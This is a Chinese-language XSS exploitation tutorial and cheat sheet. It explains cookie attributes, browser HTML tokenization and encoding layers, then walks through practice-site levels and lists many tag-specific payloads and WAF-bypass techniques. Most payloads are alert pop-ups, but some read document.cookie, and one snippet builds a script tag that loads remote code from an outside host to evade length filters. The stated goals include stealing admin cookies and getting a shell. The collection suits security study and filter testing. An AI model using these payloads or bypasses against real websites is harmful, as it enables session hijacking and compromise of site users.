# XSS漏洞挖掘与利用

## 漏洞危害

- 获取管理员Cookie，登录后台
- 获取后台地址
- 用户信息窃取
- Getshell

## 基础知识

- XSS漏洞挖掘与利用

### **1）Cookie的工作方式**

XSS漏洞的主流利用方式是获取用户的Cookie执行一系列的操作。

Cookie的基本通信流程：
```
1.设置cookie
2.cookie被自动添加到request header中
3.服务端接收到cookie
```

需要理解的问题：
```
1.什么样的数据适合放在cookie中

对于设置“每次请求都要携带的信息（身份认证信息）”特别适合存放在cookie中。

2.cookie是怎么设置的

每个cookie都有一定的属性，如什么时候失效，要发送到哪个域名，哪个路径等等。这些属性是通过cookie选项来设置的，cookie选项包括：expires、domain、path、secure、HttpOnly。在设置任一个cookie时都可以设置相关的这些属性。代码示例如下：

"SESSIONID=e6f5cad435dc6a;expires=Thu,27Feb201705:21:00GMT;domain=www.xxx.com;path=/;secure;HttpOnly

3.cookie为什么会自动加到request hearder中

存储cookie是浏览器提供的功能，cookie是存储在浏览器中的纯文本。当网页要发HTTP请求时，浏览器会先检查是否有相应的cookie，有则自动添加到request hearder中的cookie字段中。这是浏览器自动做的。

4.cookie怎么增删改查

cookie既可以由服务端来设置，也可以由客户端来设置。

cookie选项包括：expires、domain、path、secure、HttpOnly。

expires选项用来设置“cookie什么时间内有效”。expires其实是cookie失效日期，对于失效的cookie浏览器会清空。如果没有设置该选项，则默认有效期为session，即会话cookie。这种cookie在浏览器关闭后就没有了。

secure选项用来设置cookie只在确保安全的请求中才会发送。当请求是HTTPS或者其他安全协议时，包含secure选项的cookie才能被发送至服务器。

HttpOnly用来设置cookie是否能通过js去访问。

默认情况下，客户端是可以通过js代码去访问（包括读取、修改、删除等）这个cookie的。当cookie带httpOnly选项时，客户端则无法通过js代码去访问（包括读取、修改、删除等）

```

### **2）浏览器的解析方式**

语言的解析一般分为词法分析（lexical analysis）和语法分析（Syntax analysis）两个阶段，WebKit中的html解析也不例外，本文主要讨论词法分析。

词法分析的任务是对输入字节流进行逐字扫描，根据构词规则识别单词和符号，分词。

在WebKit中，有两个类，同词法分析密切相关，它是HTMLToken和HTMLTokenizer类，可以简单将HTMLToken类理解为标记，HTMLTokenizer类理解为词法解析器。HTML词法解析的任务，就是将输入的字节流解析成一个个的标记（HTMLToken），然后由语法解析器进行下一步的分析。

在XML/HTML的文档解析中，token这个词经常用到，我将其理解为一个有完整语义的单元（也就是分出来的“词”），一个元素通常对应于3个token，一个是元素的起始标签，一个是元素的结束标签，一个是元素的内容，这点同DOM树是不一样的，在DOM树上，起始标签和结束标签对应于一个元素节点，而元素内容对应另一个节点。

除了起始标签(StartTag)、结束标签(EndTag)和元素内容（Character），HTML标签还有DOCTYPE（文档类型）,Comment（注释），Uninitialized（默认类型）和EndOfFile（文档结束）等类型，参见HTMLToken.h中的Type枚举。

![](http://hi.csdn.net/attachment/201011/9/0_1289298004iCWw.gif)



标记的组成：类型，在字节流中的偏移，数据（m_data,不同的类型具有不同的意义），文档类型，是否自封闭(对于开始和结束标签)，属性列表，当前属性。

HTMLTokenizer就是要从字节流解析出一个个这样的结构体来，他的实现是基于状态机来做的。状态机模型在`<http://www.w3.org/TR/html5/tokenization.html#tokenization>`中已经明确定义，nextToken方法实现了该状态机。



以一个简单的html文档来复盘状态机的几条路线。

```
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">

<!--comment -->

<html>

<body>

<a href=”w3c.org”>w3c</a>

</body>

</html>
```

 在HTML中，某些字符是预留的。例如在HTML中不能使用“<”或“>”，这是因为浏览器可能误认为它们是标签的开始或结束。如果希望正确地显示预留字符，就需要在HTML中使用对应的字符实体。一个HTML字符实体描述如下：

| 字符显示 | 描述   | 实体名称 | 实体编号 |
| -------- | ------ | -------- | -------- |
| <        | 小于号 | &lt      | &#60；   |

字符引用包括“字符值引用”和“字符实体引用”。在上述HTML例子中，'<'对应的字符值引用为'&#60;'，对应的字符实体引用为‘&lt;’。字符实体引用也被叫做“实体引用”或“实体”。）



不考虑类似`<html>`和`<body>`之间的回车换行（webkit里面有做特殊处理，也就是所谓的“authoring convenience”，m_skipLeadingNewLineForListing），从前面的描述中，我们可以确认，该文档有9个HTMLToken，分别是文档类型声明，注释，html的起始标签，body的起始标签，a的起始标签，a的元素内容，a的介绍标签，body的结束标签，html的结束标签。

起始状态为DataState。

1）DOCTYPE

```
DataState：<!DOCTYPE，碰到’<’，进入TagOpenState

TagOpenState：<!DOCTYPE, 碰到’!’，进入MarkupDeclarationOpenState状态

MarkupDeclarationOpenState：<!DOCTYPE,碰到’D’，匹配DOCTYPE和--字数都不够，保持现状

MarkupDeclarationOpenState：<!DOCTYPE,匹配doctype，进入DOCTYPEState状态(HTMLToken的type为DOCTYPE)

DOCTYPEState: <!DOCTYPE html PUBL，碰到空格，进入BeforeDOCTYPENameState状态

BeforeDOCTYPENameState: <!DOCTYPE html PUBL，碰到’h’，进入DOCTYPENameState

DOCTYPENameState: <!DOCTYPE html PUBL，碰到’t’,保持原状态，提取html作为文档类型

DOCTYPENameState: <!DOCTYPE html PUBL，碰到空格，进入AfterDOCTYPENameState状态。(HTMLToken的m_data为html)

AfterDOCTYPENameState：<!DOCTYPE html PUBLIC，碰到’P’，还未能匹配Public或者system，保持状态

AfterDOCTYPENameState：<!DOCTYPE html PUBLIC,匹配public，进入AfterDOCTYPEPublicKeywordState

AfterDOCTYPEPublicKeywordState：<!DOCTYPE html PUBLIC "-/，碰到空格，进入BeforeDOCTYPEPublicIdentifierState

BeforeDOCTYPEPublicIdentifierState：<!DOCTYPE html PUBLIC "-/，碰到’”’，进入DOCTYPEPublicIdentifierDoubleQuotedState

DOCTYPEPublicIdentifierDoubleQuotedState：<!DOCTYPE html PUBLIC "-/，碰到’-‘，保持状态，提取m_publicIdentifier

DOCTYPEPublicIdentifierDoubleQuotedState：<!DOCTYPE html PUBLIC "-/…nal//EN">,碰到’”’,进入AfterDOCTYPEPublicIdentifierState状态。（HTMLToken的m_publicIdentifier确定）

AfterDOCTYPEPublicIdentifierState：<!DOCTYPE html PUBLIC "-/…nal//EN"> ，碰到’>’,进入DataState状态，完成文档类型的解析
```

2）COMMENT

```
DataState：<!--comment -->，碰到’<’，进入TagOpenState

TagOpenState：<!--comment -->, 碰到’!’，进入MarkupDeclarationOpenState状态

MarkupDeclarationOpenState：<!--comment -->,碰到’-’，匹配DOCTYPE和--字数都不够，保持现状

MarkupDeclarationOpenState：<!--comment -->,匹配--，进入CommentStartState状态(HTMLToken的type为COMMENT)

CommentStartState: <!--comment -->,碰到’c’，进入CommentState

CommentState：<!--comment -->，碰到’-‘，进入CommentEndDashState状态(HTMLToken的m_data为comment)

CommentEndDashState: <!--comment -->,碰到’-‘，进入CommentEndState状态

CommentEndState：<!--comment -->,碰到’>‘，进入DataState状态，完成解析。
```

3）起始标签a

```
DataState：<a href=[”w3c.org](http://www.w3c.org/)">，碰到’<’,进入TagOpenState状态

TagOpenState：<a href=[”w3c.org](http://www.w3c.org/)">，碰到’a’,进入TagNameState状态（HTMLToken的type为StartTag）

TagNameState：<a href=[”w3c.org](http://www.w3c.org/)">，碰到空格，进入BeforeAttributeNameState状态（HTMLToken的m_data为a）

BeforeAttributeNameState：<a href=[”w3c.org](http://www.w3c.org/)">，碰到‘h’,进入AttributeNameState状态

AttributeNameState：<a href=[”w3c.org](http://www.w3c.org/)">，碰到‘=’，进入BeforeAttributeValueState状态（HTMLToken属性列表中加入一个属性，属性名为href)

BeforeAttributeValueState: <a href=[”w3c.org](http://www.w3c.org/)">，碰到‘“’，进入AttributeValueDoubleQuotedState状态

AttributeValueDoubleQuotedState：<a href=[”w3c.org](http://www.w3c.org/)">，碰到‘w’，保持状态，提取属性值

AttributeValueDoubleQuotedState：<a href=[”w3c.org](http://www.w3c.org/)">，碰到‘“’，进入AfterAttributeValueQuotedState(HTMLToken当前属性的值为w3c.org).

AfterAttributeValueQuotedState: <a href=[”w3c.org](http://www.w3c.org/)">，碰到‘>’，进入DataState，完成解析。

在完成startTag的解析的时候，会在解析器中存储与之匹配的end标签（m_appropriateEndTagName），等到解析end标签的时候，会同它进行匹配（语法解析的时候）。

html，body起始标签类似a起始标签，但没有属性解析
```

4） a元素

```
DataState：w3c</a>，碰到’w’,维持原状态，提取元素内容(HTMLToken的type为character)。

DataState：w3c</a>，碰到’<’,完成解析，不consume ’<’。(HTMLToken的m_data为w3c)。
```

5）a结束标签

```
DataState：w3c</a>，碰到’<’,进入TagOpenState。

TagOpenState：w3c</a>，碰到’/’,进入到EndTagOpenState。（HTMLToken的type为endTag）。

EndTagOpenState：w3c</a>，碰到’a’,进入到TagNameState。

TagNameState：w3c</a>，碰到’>’,进入到DataState，完成解析。

```



通过以上的复盘，一个标记的token过程清晰呈现在眼前，基本上就是实现`http://www.w3.org/TR/html5/tokenization.html`这一章的一个过程，html的规范是相当宽松的，所以词法解析要考虑到的问题很多，html5specfication在这方面为实现者做了绝大部分工作。另外，html的语法解析会影响词法解析，比如语法解析在解析到head里面title的起始标签后，会将htmltokenizer解析器的状态设置为RCDATAState。



 一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，浏览器处于Datastate状态时，只要遇到一个'<'符号（后面没有跟'/'符号）就会进入“标签开始状态(Tagopenstate)”。然后转变到“标签名状态(Tagnamestate)”，“前属性名状态(beforeattributenamestate)”......最后进入“数据状态(Datastate)”并释放当前标签的token。当解析器处于“数据状态(Datastate)”时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。



这里有三种情况可以容纳字符实体，“数据状态中的字符引用”，“RCDATA状态中的字符引用”和“属性值状态中的字符引用”。在这些状态中HTML字符实体将会从“&#...”形式解码，对应的解码字符会被放入数据缓冲区中。例如，在问题4中，“<”和“>”字符被编码为“&#60;”和“&#62;”。当解析器解析完`“<div>”`并处于“数据状态”时，这两个字符将会被解析。当解析器遇到“&”字符，它会知道这是“数据状态的字符引用”，因此会消耗一个字符引用（例如“&#60;”）并释放出对应字符的token。在这个例子中，对应字符指的是“<”和“>”。大家可能会想：这是不是意味着“<”和“>”的token将会被理解为标签的开始和结束，然后其中的脚本会被执行？答案是脚本并不会被执行。原因是解析器在解析这个字符引用后不会转换到“标签开始状态”。正因为如此，就不会建立新标签。因此，我们能够利用字符实体编码这个行为来转义用户输入的数据从而确保用户输入的数据只能被解析成“数据”。

在HTML中有五类元素：

```
1.空元素(Voidelements)，如<area>,<br>,<base>等等
2.原始文本元素(Rawtextelements)，有<script>和<style>
3.RCDATA元素(RCDATAelements)，有<textarea>和<title>
4.外部元素(Foreignelements)，例如MathML命名空间或者SVG命名空间的元素
5.基本元素(Normalelements)，即除了以上4种元素以外的元素
```

五类元素的区别如下：

1.空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。

2.原始文本元素，可以容纳文本。

3.RCDATA元素，可以容纳文本和字符引用。（&#60）

4.外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释

5.基本元素，可以容纳文本、字符引用、其他元素和注释



2.原始文本元素(Rawtextelements)，有`<script>`和`<style>`3.RCDATA元素(RCDATAelements)，有`<textarea>`和`<title>`4.外部元素(Foreignelements)，例如MathML命名空间或者SVG命名空间的元素。

5.基本元素(Normalelements)，即除了以上4种元素以外的元素

HTML解析器的规则，其中有一种可以容纳字符引用的情况是“RCDATA状态中的字符引用”。这意味着在`<textarea>`和`<title>`标签中的字符引用会被HTML解析器解码。

这里要再提醒一次,在解析这些字符引用的过程中不会进入“标签开始状态”。对RCDATA有个特殊的情况。在浏览器解析RCDATA元素的过程中，解析器会进入“RCDATA状态”。

在这个状态中，如果遇到“<”字符，它会转换到“RCDATA小于号状态”。如果“<”字符后没有紧跟着“/”和对应的标签名，解析器会转换回“RCDATA状态”。这意味着在RCDATA元素标签的内容中（例如`<textarea>`或`<title>`的内容中），唯一能够被解析器认做是标签的就是`“</textarea>”`或者`“</title>”`。这要看开始标签是哪一个。在`“<textarea>”`和`“<title>”`的内容中不会创建标签，就不会有脚本能够执行。



### **3）编码知识**

- 浏览器解析规则

- - **URL编码：**

    一个百分号和该字符的ASCII编码所对应的2位十六进制数字，例如“/”的URL编码为%2F(一般大写，但不强求)

    **HTML实体编码：**

    - 命名实体：以&开头，分号结尾的，例如“<”的编码是“<”
    - 字符编码：十进制、十六进制ASCII码或unicode字符编码，样式为“&#数值;”,例如“<”可以编码为“<”和“<”

**JS编码：**js提供了四种字符编码的策略

```
1、三个八进制数字，如果不够个数，前面补0，例如“e”编码为“\145”
2、两个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\x65”
3、四个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\u0065”
4、对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）
5、jsfuck编码
```

**CSS编码：**用一个反斜线()后面跟1~6位的十六进制数字，例如e可以编码为“\65”或“65”或“00065”

HTML解析器能识别在文本节点和参数值里的实体编码，并在内存里创建文档树的表现形式时，透明的对这些编码进行解码

浏览器的解析规则：浏览器收到HTML内容后，会从头开始解析。当遇到JS代码时，会使用JS解析器解析。当遇到URL时，会使用URL解析器解析。遇到CSS则用CSS解析器解析。尤其当遇到复杂代码时，可能该段代码会经过多个解析器解析。

比如：`<a href="javascript:window.open('http://www.baidu.com')">test</a>`

这段代码，HTML解析器首先工作（注：此时，若href=”字符串”中的字符串存在字符引用，会对其解码）。然后URL解析器开始对href值进行URL解析。进行URL解析时，URL资源类型必须是ASCII字母（U+0041-U+005A || U+0061-U+007A），不然就会进入“无类型”状态。即，javascript:是不能进行任何js编码的。解析了javascript：之后，会由JS解析器进行解析。JS解析器针对一些编码，其只有在标志符名称里的编码字符才能够被正常的解析。解析完window.open以后，又会由URL解析器进行解析。想了解各解析器的特性，可参考这篇文章[深入理解浏览器解析机制和XSS向量编码](http://bobao.360.cn/learning/detail/292.html)

JS解析器不会解析和解码字符引用，而针对JS的一些编码其会视情况而定。

可以看到，该代码经过了HTML->URL->JS->URL 四重解析。由于不同的解析器能够分别对一些编码格式进行解析，所以我们可以通过生成特定格式的编码代码，令其在依次解码后能够正确执行，从而绕过WAF。

如：

```
<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:%61%6c%65%72%74%28%32%29">test</a>
```

该代码能够正确执行。

首先，经过HTML解析之后，代码会变成

```
<a href="javascript:%61%6c%65%72%74%28%32%29">test</a>
```

此时，由于javascript已经生成，不违反URL解析规则。所以，URL解析正常。解析了javascript，最终进入JS解析器。注意，URL解析器还完成了URL解码工作。

```
<a href="javascript:alert(2)">test</a>
```

所以，JS最终解析的代码时alert(2).成功执行。

总结来说，各种编码在XSS中的利用非常灵活，我们需要在充分了解浏览器的解析原理合理构造合理编码顺序的代码，最终构造出Payload。



### **4）XSS分类介绍**

- 反射性XSS

  恶意代码通常存在于URL中需要用户去点击相应的链接才会触发，隐蔽性较差而且，而且可能会被浏览器的XSSFilter干掉

流程：输入--输出

- 存储型XSS

恶意代码通常存在于数据库中用户浏览被植入payload的“正常页面”时即可触发，隐蔽性较强，成功率高，稳定性好。

流程：输入--进入数据库--取出数据库--输出

## 测试Payload

常规测试的Payload可以使用`https://xss.haozi.me/#/0x01`测试

- 0x00

输出位置可以使用标签

```
<script>alert(1)</script>
```
- 0x01
闭合前面的标签，之后创建新的`<script>`标签

```
</textarea><script>alert(1)</script>
```
- 0x02
在属性值内的情况，用">闭合前面的input标签，之后创建新的`<script>`标签

```
"><script>alert(1)</script>
```
- 0x03
利用事件属性，`<img src=x onerror=alert&#40;1&#41;>`

src报错，出发onerror事件。

```
<img src=x onerror=alert&#40;1&#41;>
```
- 0x04
使用DATA URI Scheme和实体绕过

```
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>

<iframe srcdoc="<script>alert&#x28;1&#x29;</script>"></iframe>
```
- 0x05
注释符闭合绕过

```
--!><script>alert(1)</script>
```
- 0x0   6
换行符绕过，具体应该是%0A

```
type=image src=1 onerror
=alert(1)
```
- 0x07
DOM事件，换行绕过。

```
<svg onload=alert(1) 
```
- 0x08
匹配单标签截断绕过

```
</style ><script>alert(1)</script>
```
- 0x0D
换行绕过+注释绕过

```

alert(1)
-->
```

- 0x0F
```
');alert('1
```
- 0x10
实体绕过

```
123;alert(1)
```
- 0x11
引号闭合

```
");alert("1
```
- 0x12
标签截断

```
\");alert(1)//
```

## WAF绕过

```
  简单: "'<script javascript onload src><a href></a>#$%^ 
  全面: '";!-=#$%^&{()}<script javascript data onload href src img input><a href></a>alert(String.fromCharCode(88,83,83));prompt(1);confirm(1)</script>
  
```

  观察输入输出情况，一些特殊字符是否被编码、标签是否被过滤、输出点在标签之间或标签之内。

### 输出位置进行XSS

* 标签之间

```
    模型： <div>[xss]</div> 
    payload： <script>alert(1)</script>或者<img src=1 onerror=alert(1)> 
    这些标签有：
    <a> <p> <img> <body> <button> <var> <div> <object> <input> <select> <keygen> <frameset>  <embed> <svg> <video> <audio>
           
    自带HtmlEncode（转义）功能的标签(RCDATA)，这是插入的javascript不会被执行，除非闭合掉它们。
    <textarea></textarea> 
    <title></title> 
    <iframe></iframe> 
    <noscript></noscript> 
    <noframes></noframes> 
    <xmp></xmp> 
    <plaintext></plaintext> 
    其他：<math></math>
```

- 在JS标签内：
  
    在该位置，空格被过滤，可用/**/代替空格。输出在注释中，通过换行符%0a %0d使其逃逸出来。
    

1.不在字符串内。
判断<>/是否被过滤。如果没有，那么直接插入就可以。

```
    <script>
    [output]
    </script>

    payload：

    </script><script>alert(1)</script>
```

2.在字符串中
此时需要闭合字符串，并保证插入的JS代码符合语法规范。如：

```
    <script>
    Var x="Input";
    </script>
    
    payload:
    
    input是输出点，我们首先要闭合双引号，才能保证XSS成功。如果我们无法闭合包括字符串的引号（引号被转义），就很难利用。
```

    除非存在两个输出点或宽字节，在引号被转义成"时有效。在网页为GBK编码时，存在宽字节问题。
    
    | 反斜线复仇记                                                 | 利用点     |
    | ------------------------------------------------------------ | ---------- |
    | `https://wizardforcel.gitbooks.io/xss-naxienian/content/4.html` | 两个输入点 |
    | 那些年我们一起学XSS【宽字节复仇记】                          |            |
    | `https://wizardforcel.gitbooks.io/xss-naxienian/content/3.html` | 宽字节     |

- 输出在HTML属性内

1.文本属性中

      例如：`<input value="输出">` 、 `<img onload="...[输出]...">` ，再比如 `<body style="...[输出]...">`
    
      - 无引号包裹，直接添加新的事件属性。
      - 有引号包括。首先测试引号是否可用，可用则闭合属性之后添加新的事件属性。
    
    HTML的属性，如果被进行HTML实体编码(形如'&#x27)，那么HTML会对其进行自动解码，从而我们可以在属性里以HTML实体编码的方式引入任意字符，从而方便我们在事件属性里以JS的方式构造payload。当然，也可以闭合属性后，然后再执行脚本。



2.`src/href/action/xlink:href/autofocus/content/data`等属性直接使用伪协议绕过。

```
    javascript 伪协议： <a href=javascript:alert(2)>test</a> 
    
    data 协议执行 javascript： <a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==>test</a>(Chrome被拦截，Firefox可以) 
    
    urlencode 版本： <a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E>(测试未通过)
    
    不使用 href 的另外一种组合来执行 
    js： <svg><a xlink:href="javascript:alert(14)">
         <rect width="1000" height="1000" fill="white"/>
         </a></svg>（均可） 
         或者： 
      <math>
          <a xlink:href=javascript:alert(1)>1</a>
          </math>(Chrome不可，Firefox可以)
```

    如果不行，则测试添加事件进行触发。（首先还是需要闭合）如：
```
<a href="test.com" onmouseover=alert(1)>ClickHere</a>
```

3.on*事件

插入合乎逻辑的JS代码即可。也可以使用伪协议。

常见事件

```
onload 
onclick
onunload 
onchange 
onsubmit 
onreset 
onselect 
onblur 
onfocus 
onabort 
onkeydown 
onkeypress 
onkeyup 
ondbclick 
onmouseover 
onmousemove 
onmouseout 
onmouseup 
onforminput 
onformchange 
ondrag 
ondrop
```

4.style属性内及css代码之中IE可执行，并且在IE6以上被防御，不适合其他浏览器，基本已死。

```
style="width:expression(js代码)"
background-image:url('javascript:alert(2)')
```

输出在meta标签

```
<meta http-equiv="refresh" content="0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E">
```



### **具体标签的Payload**

1.a标签

 - javascript伪协议：

```
<a href=javascript:alert(2)>
```

 - data协议执行javascript：

```
<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==>
```

 - urlencode版本：

```
<a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E>
```

 - 不使用href的另外一种组合来执行js：

```
<svg><a xlink:href="javascript:alert(14)"><rect width="1000" height="1000" fill="white"/></a></svg> 
或者
<math><a xlink:href=javascript:alert(1)></math>
```

2.script标签

- 最简单的测试payload：

```
  <script>alert(1)</script>
```

-  jsfuck版本：

```
  http://www.jsfuck.com/
  
  <script>alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])</script>
```

- 各种编码版本：

```
  <script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script>
  
  <script>prompt(-[])</script>//不只是alert。prompt和confirm也可以弹窗 
  
  <script>alert(/3/)</script>//可以用"/"来代替单引号和双引号 
  
  <script>alert(String.fromCharCode(49))</script> //我们还可以用char
  
  <script>alert(/7/.source)</script> // ".source"不会影响alert(7)的执行
  
  <script>setTimeout('alert(1)',0)</script> //如果输出是在setTimeout里，我们依然可以直接执行alert(1)
```

3.button标签

- event事件实现js调用：

```
  <button/onclick=alert(1) >M</button>
```

-   html5的新姿势：

  需要交互的版本：

```
<form><button formaction=javascript&colon;alert(1)>M
```

不需要交互的版本：

```
<button onfocus=alert(1) autofocus>
```

4.p标签

- 如果发现变量输出在p标签中，只要能跳出`""`就足够了：
```
  <p/onmouseover=javascript:alert(1); >M</p>
```

5.img标签

  有些姿势是因为浏览器的不同而不能成功执行的。

- chrome下有效：

```
<img src ?itworksonchrome?\/onerror = alert(1)>  //只在chrome下有效

<img/src/onerror=alert(1)>  //只在chrome下有效
```

- 其他：


```
<img src=x onerror=alert(1)> 

<img src="x:kcf" onerror="alert(1)">
```

6.body标签

通过event事件来调用js

```
<body onload=alert(1)> 
<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
```

7.var标签

```
<var onmouseover="prompt(1)">M</var>
```

8.div标签

```
<div/onmouseover='alert(1)'>X

<div style="position:absolute;top:0;left:0;width:100%;height:100%" onclick="alert(52)">
```

9.iframe标签

有时候我们可以通过实体编码、换行和Tab字符来bypass。我们还可以通过事先在swf文件中插入我们的xss code，然后通过src属性来调用。不过关于flash，只有在crossdomain.xml文件中，allow-access-from domain=”*“允许从外部调用swf时，才可以通过flash来事先xss attack。

下面的`&Tab;`为tab字符

```
<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe> 

<iframe SRC="http://0x.lv/xss.swf"></iframe> 

<IFRAME SRC="javascript:alert(1);"></IFRAME> 

<iframe/onload=alert(1)></iframe>
```

10.meta标签

测试时发现昵称，文章标题跑到meta标签中，那么只需要跳出当前属性再添加`http-equiv="refresh"`，就可以构造一个有效地xss payload。还有一些猥琐的思路，就是通过给`http-equiv`设置`set-cookie`，进一步重新设置cookie来干一些猥琐的事情。

```
  <meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
  
  <meta http-equiv="refresh" content="0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E">
```

- - object标签

和a标签的href属性的玩法是一样的，优点是无需交互。

```
<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=></object>
```

- - marquee标签

```
<marquee onstart="alert('1')"></marquee>
```

- -  isindex标签

在一些只针对属性做了过滤的webapp中，action很有可能是漏网之鱼。

```
<isindex type=image src=1 onerror=alert(1)> 

<isindex action=javascript:alert(1) type=image>
```

- - input标签

通过event来调用js。和button一样通过autofocus可以达到无需交互即可弹窗的效果。

```
<input onfocus=javascript:alert(1) autofocus> 

<input onblur=javascript:alert(1) autofocus><input autofocus>
```

- - select标签

```
<select onfocus=javascript:alert(1) autofocus>
```

- - textarea标签

```
<textarea onfocus=javascript:alert(1) autofocus>
```

- - keygen标签

```
<keygen onfocus=javascript:alert(1) autofocus>
```

- - frameset标签

```
<FRAMESET><FRAME SRC="javascript:alert(1);"></FRAMESET> 
```

- - embed标签

```
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4="></embed> //chrome 

<embed src=javascript:alert(1)> //firefox
```

- - svg标签

```
<svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>

<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg>  //chrome有效
```

- - math标签

```
<math href="javascript:javascript:alert(1)">CLICKME</math> 

<math><y/xlink:href=javascript:alert(51)>test1 

<math> <maction actiontype="statusline#http://wangnima.com" xlink:href="javascript:alert(49)">CLICKME
```

- - video标签

```
<video><source onerror="alert(1)"> 

<video src=x onerror=alert(48)>
```

- - audio标签

```
<audio src=x onerror=alert(47)>
```

- - background属性

```
<table background=javascript:alert(1)></table> // 在Opera 10.5和IE6上有效
```

- - poster属性

```
<video poster=javascript:alert(1)//></video> // Opera 10.5以下有效
```

- - code属性

```
<applet code="javascript:confirm(document.cookie);"> // Firefox有效
embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
```

- - expression属性

```
<img style="xss:expression(alert(0))"> // IE7以下

<div style="color:rgb(''&#0;x:expression(alert(1))"></div> // IE7以下

<style>#test{x:expression(alert(/XSS/))}</style> // IE7以下
```

### **过WAF技巧**

- 单次过滤规则绕过：有些规则仅进行一次过滤替换，可以通过双重复写绕过`<scr<script>ipt>`
- 大小写绕过：`<sCript>`
- alert被过滤，可以尝试prompt和confirm
- 没有引号和分号：`<IMG SRC=javascript:alert('XSS')>`
- 空格被过滤：`<img/src=""onerror=alert(2)> <svg/onload=alert(2)></svg>`
- 反引号妙用：
- 长度限制时： `<q/oncut=alert(1)>//在限制长度的地方很有效`
- 单引号及双引号被过滤情况: `<script>alert(/jdq/)</script> //用双引号会把引号内的内容单独作为内容 用斜杠，则会连斜杠一起回显`
- javascript伪协议
```
<a href="javascript:alert(/test/)">xss</a>
<iframe src=javascript:alert('xss');height=0 width=0 /><iframe>利用iframe框架标签
```

- 畸形payload：`<IMG """><SCRIPT>alert("XSS")</SCRIPT>">`
- /的妙用：`<script>alert(/3/)</script>`
- 括号被过滤,可以使用throw来抛出数据

```
<a onmouseover="javascript:window.onerror=alert;throw 1">2</a>

<img src=x onerror="javascript:window.onerror=alert;throw 1">
```

以上两个测试向量在 Chrome 和 IE 上会出现一个 “uncaught” 错误，可以用下面的向量代替（下面向量在FireFox上测试失败）

```
<body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29';>
```

- 当=();:被过滤时:`<svg><script>alert&#40/1/&#41</script>`opera 中可以不闭合 `<svg><script>alert&#40 1&#41` // Opera可查

- 过滤某些关键字（如：javascript） 可以在属性中的引号内容中使用空字符、空格、TAB换行、注释、特殊的函数，将代码行隔开。
  - 比如在使用`<iframe src="javascript:alert(1253)" height=0 width=0 /><iframe>`时，可以用回车、Tab键将src中的内容隔开，回车的url编码为%0a,%0b; 
  - 拼凑法：① 双写绕过；② 使用js定义变量z=scri, z+pt=script; ③ 两处输出点`<scri<!-- 第二处-->pt>`;

- 无法使用href:

```
<a onmouseover="alert(document.cookie)">xxs link</a>
在chrome下，其回补全缺失的引号。因此，也可以这样写：
<a onmouseover=alert(document.cookie)>xxs link</a>
```

- 解决限制字符(要求同页面)

```
<script>z=’document.’</script> 
<script>z=z+’write(“‘</script> 
<script>z=z+’<script’</script> 
<script>z=z+’ src=ht’</script> 
<script>z=z+’tp://ww’</script>
<script>z=z+’w.shell’</script> 
<script>z=z+’.net/1.’</script> 
<script>z=z+’js></sc’</script>
<script>z=z+’ript>”)’</script> 
<script>eval_r(z)</script>
```

- 编码

```
JS函数（如eval，settimeout）还有就是href= action= formaction= location= on*= name= background= poster= src= code=这些地方，可以配合编码。此外，data属性可以base64编码。

1.js16进制

<script>eval(“js+16进制加密”)</script> <script>eval("\x61\x6c\x65\x72\x74\x28\x22\x78\x73\x73\x22\x29")</script> 编码要执行的语句↓
Alert(“xss”)

2.js unicode

<script>eval("unicode加密")</script> //js unicode加密 解决alert()被过滤
<script>eval("\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029")</script>

3.String.fromCharCode函数（不需要任何引号，必须函数内）

<script>eval(String.fromCharCode编码内容))</script> <script>eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,13))</script>

4.jsfuck版本

<script>alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])</script>

